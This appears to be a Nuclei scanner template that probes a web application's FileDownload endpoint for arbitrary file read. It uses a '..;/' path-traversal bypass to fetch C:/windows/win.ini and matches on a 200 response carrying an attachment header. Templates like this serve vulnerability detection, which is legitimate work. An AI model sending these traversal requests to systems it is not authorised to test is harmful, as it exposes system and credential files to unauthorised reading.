id: msk-template

info:
  name: msk-template
  author: msk
  severity: high



http:
  - raw:
      - |
        GET /pub/fe/config/..;/..;/..;/bg/attach/FileDownload?execlPath=C:/windows/win.ini HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
        Accept: */*
        Accept-Encoding: gzip, deflate, br
        Accept-Language: en-US;q=0.9,en;q=0.8
        Cache-Control: max-age=0
        Connection: close

      - |
        GET /pub/fe/config/..;/..;/..;/bg/attach/FileDownload?execlPath=this_is_waf HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
        Accept: */*
        Accept-Encoding: gzip, deflate, br
        Accept-Language: en-US;q=0.9,en;q=0.8
        Cache-Control: max-age=0
        Connection: close


    stop-at-first-match: true
    matchers:
      - type: dsl
        dsl:
          - status_code==200 && contains_all(all_headers,"attachment;filename=")

